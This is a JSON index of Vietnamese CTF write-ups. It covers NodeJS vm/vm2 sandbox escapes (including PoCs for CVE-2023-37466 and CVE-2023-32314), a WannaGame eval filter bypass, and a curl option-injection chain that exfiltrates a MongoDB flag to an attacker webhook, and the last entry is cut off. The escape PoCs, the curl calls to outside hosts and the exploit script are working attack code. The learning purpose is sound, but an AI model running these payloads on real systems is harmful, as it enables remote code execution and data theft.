[
  
  {
    "title": "NodeJS escape VM and some gadgets chaining in NodeJS",
    "url": "/posts/Nodejs-escapeVM/",
    "categories": "CTF Writeup",
    "tags": "NodeJS, Esacpe VM",
    "date": "2024-08-11 23:00:00 +0700",
    





    
    "snippet": "NodeJS escape VM and some gadgets chaining in NodeJSSandbox là gì?Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng ...",
    "content": "NodeJS escape VM and some gadgets chaining in NodeJSSandbox là gì?Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính.Escape VMVM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chínhModule VMSử dụng module node:vm (ngoài ra còn có vm2 ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụconst vm = require('node:vm');const x = 1;const context = { x: 2 };vm.createContext(context); // tạo ngữ cảnhconst code = 'x += 40; var y = 17;';// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x);console.log(y); // 1; y is not defined. Có nghĩa là code chạy trong context sẽ không ảnh hưởng đến biến ngoài context và ngược lạiAn insecure JavaScript sandbox  vm.runInThisContext(code):Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khácconst vm = require('vm');let globalobject = process;const vmResult = vm.runInThisContext('process');;if (globalobject === vmResult) {    console.log('VM is running in the global context');}///VM is running in the global contextconst vm = require('vm');let localVar = 'di';const vmResult = vm.runInThisContext('localVar = \"box\";');console.log('vmResult:', vmResult);console.log('localVar:', localVar);// vmResult: 'box', localVar: 'di'  vm.createContext([sandbox]): Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong globalconst vm = require('vm');global.test = 9;const sandbox = { test : 9};vm.createContext(sandbox);vm.runInContext('test = test + 3', sandbox);console.log(global.test); // 9console.log(sandbox); // { test: 12 }Hàm vm.runInNewContext(code[, sandbox][, options]) là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm mộtvm.Script là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox.script có thể được chạy thông qua runInNewContextKhi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng process. Một khi đã có được đối tượng process, chúng ta có thể sử dụng require để nhập child_process và sau đó dùng child_process để thực thi các lệnh hệ thống. Mặc dù đối tượng process được gắn vào global, khi tạo một ngữ cảnh mới (sử dụng createContext), đối tượng global không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng process từ global vào môi trường sandbox.const vm = require(\"vm\");const test = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);console.log(test);hoặcconst vm = require('vm');const sandbox = { test : 1337};vm.createContext(sandbox);vm.runInContext(`test = this.constructor.constructor('return process.env')()`, sandbox);console.log(sandbox)Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên this trỏ đến runInContext ( hoặc runInNewContext), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được Function (cái này là của bên ngoài sandbox). Cuối cùng dựa vào Function mà ta vừa lấy được ta có thể lấy được processNói một cách đơn giản, quá trình này ta chain các gadget để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandboxSau khi có process thì RCE là chuyện đơn giảnMột số trường hợp khácconst vm = require('vm');const script = `(() =&gt; {  const a = {};  a.toString = function () {    const cc = arguments.callee.caller;    const p = (cc.constructor.constructor('return process'))();    return p.mainModule.require('child_process').execSync('whoami').toString();  };  return a;})()`;const sandbox = Object.create(null);const context = new vm.createContext(sandbox);const res = vm.runInContext(script, context);console.log('Hello ' + res);Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là arguments.callee.caller. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại.Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính arguments.callee.caller sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox.Giải thích đơn giảnTóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là Function và arguments.callee.caller và từ đó ta có thể làm bất cứ điều gì.  Ngoài vm ra thì còn một module khác là vm2 được coi là “bản nâng cấp” của vm. vm2 là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. vm2 dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như vm thì vm2 cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đâyCVE-2023-37466In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code.POCconst {VM} = require(\"vm2\");const vm = new VM();const code = `async function fn() {    (function stack() {        new Error().stack;        stack();    })();}p = fn();p.constructor = {    [Symbol.species]: class FakePromise {        constructor(executor) {            executor(                (x) =&gt; x,                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }            )        }    }};p.then();`;console.log(vm.run(code));Phân tíchMột trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCEBan đầu khi mới vào thì Promise.prototype.then đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function onRejectedĐọc document của ES2022 của Promise.prototype.then có chỉ một đoạn liên quan đến @@species ở đây linkWhen the then method is called with arguments onFulfilled and onRejected, the following steps are taken:1. Let promise be the this value.2. If IsPromise(promise) is false, throw a TypeError exception.**3. Let C be ? SpeciesConstructor(promise, %Promise%).****4. Let resultCapability be ? NewPromiseCapability(C).****5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).**Có 3 đoạn cần chú ý ở trên đó là SpeciesConstructor, NewPromiseCapability và PerformPromiseThen1. Let C be ? Get(O, \"constructor\").2. If C is undefined, return defaultConstructor.3. If Type(C) is not Object, throw a TypeError exception.4. Let S be ? Get(C, @@species).5. If S is either undefined or null, return defaultConstructor.6. If IsConstructor(S) is true, return S.7. Throw a TypeError exception.Đây là pesudo code của SpeciesConstructor cả đoạn trên tóm lại là nó sẽ return object @@speciesvà tiếp theo là  NewPromiseCapability1. If IsConstructor(C) is false, throw a TypeError exception.2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1).3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }.4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called:a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception.b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception.c. Set promiseCapability.[[Resolve]] to resolve.d. Set promiseCapability.[[Reject]] to reject.e. Return undefined.5. Let executor be CreateBuiltinFunction(executorClosure, 2, \"\", « »).6. Let promise be ? Construct(C, « executor »).7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception.8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception.9. Set promiseCapability.[[Promise]] to promise.10. Return promiseCapability.Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau  NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của @@sepcies, sau đó sử dụng executor là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là resolve và reject và gán mỗi giá trị vào resultCapability.[[Resolve]] và resultCapability.[[Reject]].Tiếp tục ở đoạn PerformPromiseThen, nó có định nghĩa promise.[[PromiseState]] lúc bị rejected8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }.9. If promise.[[PromiseState]] is pending, then ...10. Else if promise.[[PromiseState]] is fulfilled, then ...11. Else,    a. Assert: The value of promise.[[PromiseState]] is rejected.    b. Let reason be promise.[[PromiseResult]].    c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, \"handle\").    d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason).    e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]).Trong này có 1 đoạn quan trọng là rejectJob = NewPromiseReactionJob(rejectReaction, reason) vì nó sẽ là điều kiện để chúng ta thực hiện RCETiếp tục đọc mã giả của NewPromiseReactionJob1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called:    a. Let promiseCapability be reaction.[[Capability]].    b. Let type be reaction.[[Type]].    c. Let handler be reaction.[[Handler]].    d. **If handler is empty, then**        i. If type is Fulfill, let handlerResult be NormalCompletion(argument).        ii. Else,            1. Assert: type is Reject.            2. **Let handlerResult be ThrowCompletion(argument).**    e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)).    f. If promiseCapability is undefined, then        i. Assert: handlerResult is not an abrupt completion.        ii. Return empty.    g. Assert: promiseCapability is a PromiseCapability Record.    h. **If handlerResult is an abrupt completion, then**        i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).**    i. Else,        i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »).Ta sẽ chú ý đến các đoạn d.ii, h.iNếu handler không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối.Sau đó làNếu handlerResult là một hoàn thành đột ngột(abrupt completion), thìTrả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult.Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau:  Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object  Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý resolve và reject(ta bỏ payload vào đây)  Gọi then để trigger Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). và ez RCECVE-2023-32314A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context.POCconst { VM } = require(\"vm2\");const vm = new VM();const code = `  const err = new Error();  err.name = {    toString: new Proxy(() =&gt; \"\", {      apply(target, thiz, args) {        const process = args.constructor.constructor(\"return process\")();        throw process.mainModule.require(\"child_process\").execSync(\"echo hacked\").toString();      },    }),  };  try {    err.stack;  } catch (stdout) {    stdout;  }`;console.log(vm.run(code));Phân tíchCVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơnKhi err.name.toString được gọi ở  ErrorPrototypeToString trong prepareStackTrace thì nó lại là trong ngữ cảnh của máy chính  error của  prepareStackTrace không được xử lý qua cơ chế proxy của vm2 nên nó được gọi thẳng bởi V8Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau7. Let argArray be CreateArrayFromList(argumentsList).8. Return ? Call(trap, handler, « target, thisArgument, argArray »).Khi err.name.toString được gọi thì CreateArrayFromList() sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào apply(target, thiz, args). Vậy ta có thể tiếp cận được Function ở máy chính. Từ đó RCEGadgets chainingGadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCENote: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dướitoString.constructor.prototype.toString=toString.constructor.prototype.call;var a=[\"process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')\"];a[1]=\"x\";b={};b[Symbol.hasInstance]=a.sort;b[\"__proto__\"]=a;toString.constructor instanceof b;Giải thích sơ qua về payload này      Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó        Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function)        Tiếp theo ta gán giá trị 'x' cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này)        Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort        Sau đó set __proto__ của b là a        Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE)  Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt độngSyntaxobject instanceof constructorToán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay khôngVí dụ đơn giản như sauclass BOX {}let DI = new BOX();console.log(DI instanceof BOX); //trueNgoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceofVí dụ 1:BOX = {[Symbol.hasInstance]: (dib) =&gt; {    // console.log(dib)    return dib === 'dib'}};DI = 'dib'console.log(DI instanceof BOX); //trueVí dụ 2:a = ['1','0']a.__proto__['loG'] = function(a) {    console.log(\"triggered\")}BOX = {[Symbol.hasInstance]: a.loG};DI = Functionconsole.log(DI instanceof BOX); // \"triggered\"// console.log(a)Đến phần chính, đi sâu vào giải thích vì sao nó hoạt độngtoString.constructor instanceof b;Khi câu lệnh này được thực thi thì:      Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào        Khi a.sort(function sort) được gọi đến thì bình thường  thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function        Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a        Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter  (function anonymous(x) {process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')})  Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function)Đây là code mô phỏng lại quá trình sorttoString.constructor.prototype.toString=Function.call;Function(a[1].toString(),a[0].toString()).toString();"
  },
  
  {
    "title": "WannaGame",
    "url": "/posts/Wannagame2024/",
    "categories": "CTF Writeup",
    "tags": "NodeJS, Bypass Filter",
    "date": "2024-06-14 23:00:00 +0700",
    





    
    "snippet": "WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này.newchallThis is a simple cal...",
    "content": "WannaGame vừa mới kết thúc, mình xin viết lại một số bài mà mình làm được, giải này mình khá may mắn khi giải được 2 bài và mình cũng học được rất nhiều thứ từ giải này.newchallThis is a simple calc program,let's try /exec?q=9*10.Author: dcthinhhttp://45.122.249.68:20011Bài này cho một trang web có chức năng như trên và mình đoán khá là chắc rằng tất cả những gì mình nhập vào sẽ được đưa vào eval nên chúng ta cứ thử một số payload đơn giản vào trước.require(\"child_process\").spawnSync('ls').output.toString()Và có vẻ như là bị chặn, mình nghĩ là có thể chặn một số từ khóa như require hoặc child_process nên mình sẽ thử một số payload khácPayload 1:global.process.mainModule.require('child_process').execSync('ls').toString()Tất nhiên cái này sẽ bị chặn vì có từ khóa require nên mình sẽ tìm cách để bypass cái này. Chúng ta có thể gọi require như sauglobal.process.mainModule[\"require\"]Ta có thể đổi require thành requir\\145 (\\145 là mã octal của e) vì trong quá trình thực thi requir\\145 sẽ được chuyển thành require và chúng ta có thể lợi dụng cái này để bypass filtersPayload cuối cùngglobal.process.mainModule[\"requir\\145\"]('chil\\144_proces\\163')[\"spaw\\156Sy\\156c\"]('cat',['flag.txt']).output.toString();Và mình có được flagSau khi dump ra được source thì đây là các chuỗi bị chặnblacklist = ['system', 'child_process', 'exec', 'spawn', 'eval', 'require'];Payload 2:Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dướitoString.constructor.prototype.toString=toString.constructor.prototype.call;var a=[\"process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')\"];a[1]=\"x\";b={};b[Symbol.hasInstance]=a.sort;b[\"__proto__\"]=a;toString.constructor instanceof b;Giải thích sơ qua về payload này      Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó        Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function)        Tiếp theo ta gán giá trị 'x' cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này)        Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort        Sau đó set __proto__ của b là a        Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE)  Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt độngSyntaxobject instanceof constructorToán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay khôngVí dụ đơn giản như sauclass BOX {}let DI = new BOX();console.log(DI instanceof BOX); //trueNgoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceofVí dụ 1:BOX = {[Symbol.hasInstance]: (dib) =&gt; {    // console.log(dib)    return dib === 'dib'}};DI = 'dib'console.log(DI instanceof BOX); //trueVí dụ 2:a = ['1','0']a.__proto__['loG'] = function(a) {    console.log(\"triggered\")}BOX = {[Symbol.hasInstance]: a.loG};DI = Functionconsole.log(DI instanceof BOX); // \"triggered\"// console.log(a)Đến phần chính, đi sâu vào giải thích vì sao nó hoạt độngtoString.constructor instanceof b;Khi câu lệnh này được thực thi thì:      Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào        Khi a.sort(function sort) được gọi đến thì bình thường  thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function        Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a        Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter  (function anonymous(x) {process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')})  Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function)Đây là code mô phỏng lại quá trình sorttoString.constructor.prototype.toString=Function.call;Function(a[1].toString(),a[0].toString()).toString();Từ đó ta RCE và lấy được flagFlag: W1{hehehe}P/S: thật ra cách này đúng là “dùng dao mổ trâu để giết gà” vì cách này dùng cho những bài với filter chặt và bị hạn chế nhiều thứ. Do mình có sử dụng cách này khi thi nên tiện thể phân tích luôn cách nàyCURRLet explore my website!!!Author: dcthinhhttp://45.122.249.68:20014Tóm tắt về source code của trang web nàyApp này có 3 route ,/ , /api/login và /api/curr và mình sẽ tập trung vào route /api/currRoute này có chức năng là dùng lệnh curl với các options như là -d, …, và có một cái middleware là /api/login để kiểm tra loginUsers và Flag được lưu trong mongoDB và đọc code một lúc thì không có cách nào để login hay bypass login cảconst crypto = require(\"crypto\");const app = db.getSiblingDB('app');app.users.insertOne({ user: \"admin\", pass: crypto.randomBytes(64).toString(\"hex\") });const secret = db.getSiblingDB('secret');secret.flag.insertOne({ flag: process.env.FLAG || \"W1{REACTED}\" });Nhưng nhìn kỉ lại midleware thì mình thấy một điều khá là lạconst requiresLogin = (req, res, next) =&gt; {    if (!req.session.user) {        res.redirect(\"/?error=login first\");    }    next();};Vì sao lại có next(); ở dưới cùng của middleware này, mình nghĩ là có vẻ như là dù không có login nhưng vẫn có thể đi tới endpoint sau chăng ?Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôiĐến phần /api/currapp.post(\"/api/curr\", requiresLogin, (req, res) =&gt; {    let { url } = req.body;    if (!url || typeof url !== \"string\") {        return res.json({ success: false, message: \"Invalid URL\" });    }    try {        let parsed = new URL(url);        if (![\"http:\", \"https:\"].includes(parsed.protocol)) throw new Error(\"Invalid URL\");    }    catch (e) {        return res.json({ success: false, message: e.message });    }    const args = [ url ];    let { opt, data } = req.body;    if (opt &amp;&amp; data &amp;&amp; typeof opt === \"string\" &amp;&amp; typeof data === \"string\") {        if (!/^-[A-Za-z]$/.test(opt)) {            return res.json({ success: false, message: \"Invalid option\" });        }        // check method        if (opt === \"-d\" || [\"GET\", \"POST\"].includes(data)) {            args.push(opt, data);        }    }    cp.spawn('curl', args, { timeout: 2000, cwd: \"/tmp\" }).on('close', (code) =&gt; {        // save result to database        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });    });});Phần này sẽ lấy URL của chúng ta và kiểm tra nó sau đó kiểm tra phần opt nếu nó qua được phần kiểm tra thì sẽ thực thi lệnh curr với các options mà ta thêm vàoPhần kiểm tra opt khá là chặt. Đầu tiên kiểm tra xem opt có bắt đầu bằng - và sau đó 1 là 1 ký tự [a-zA-Z] không, tiếp sau đó kiểm tra opt một là -d và là data hay là 1 option bất kỳ và có data là GET, hoặc là POST.Và curl có hỗ trợ một options là -K (–config) option này giúp cho lệnh curl của chúng ta đọc từ một file text và sử dụng nó làm các options. Từ đó suy ra nếu mà có cách nào đó để chúng ta download file options của chúng ta về server và bắt server curl với options đó ta có thể curl tới bất kỳ URL nàoĐể thử thì đây là options thử nghiệm--url \"http://XXXXXX.requestrepo.com\"user-agent = \"yuu\"Ta có thể setup một python http server và expose bằng ngrok để và dùng curl để download file bằng cách sauurl =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GETTiếp tục ta thử xem liệu nó có request đến server của mình với useragent là yuu khôngurl =xxxxxx.webhook.com&amp;opt=-K&amp;data=GETVậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốnVậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dướiNhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCPVậy ta có thể gửi một binary file(TCP transfer - file này chứa một giao tiếp lấy flag) cho mongo database server để server trả cái flag vềTa có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đóFile js dùng để lấy flagconst  { MongoClient } = require( \"mongodb\" );const client = new MongoClient( \"mongodb://mongodb:27017/\" );client.connect().then(async () =&gt; {     const flag = client.db( \"secret\" ).collection( \"flag\" );    var flag_1 = await flag.findOne()    console.log(flag_1);    client.close();} );Đây là nội dung lúc giao tiếp với serverTa có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với databaseThử dùng file này để giao tiếp xem có được khôngNó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách nàyVậy cuối cùng đây là cách làm  Tải file options với nội dung bên dưới url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET--max-time 1--upload-file \"POST\"--url \"telnet://mongodb:27017\"-o \"GET\"      Tiếp theo tải file data tcp mà ta bắt được vào server url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST        Sau đó request đến một trang web bất kỳ với option là file GET(options mà ta lúc nãy gửi) url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET ( lúc này là lúc mà chúng ta giao tiếp với database để lấy flag và lưu vào GET)        Cuối cùng là upload file GET về server của ta url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET  Payload tự động lấy flagimport requestsimport time# URL = \"http://localhost:8888\"URL = \"http://45.122.249.68:20014\"data = {    \"url\": \"https://NGROKSERVER/options.txt\",    \"opt\": \"-o\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(1)data = {    \"url\": \"https://NGROKSERVER/test.data.dat\",    \"opt\": \"-o\",    \"data\": \"POST\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(1)data = {    \"url\": \"http://ABCXYZ.COM\",    \"opt\": \"-K\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(5)data = {    \"url\": \"http://WEBHOOKSERVER.COM\",    \"opt\": \"-T\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)Flag: W1{nice_try_without_gopher}Kết bài"
  },
  
  {
    "title": "KCSC 2024",
    "url": "/posts/KCSCCTF/",
    "categories": "CTF Writeup",
    "tags": "Python, Flask, Path Traversal",
    "date": "2024-05-15 23:00:00 +0700",
    





    
    "snippet": "Bài Ka Tuổi TrẻTóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint / với params file sau đó thêm ./static vào đằng trước file để đọc file trong thư mục st...",
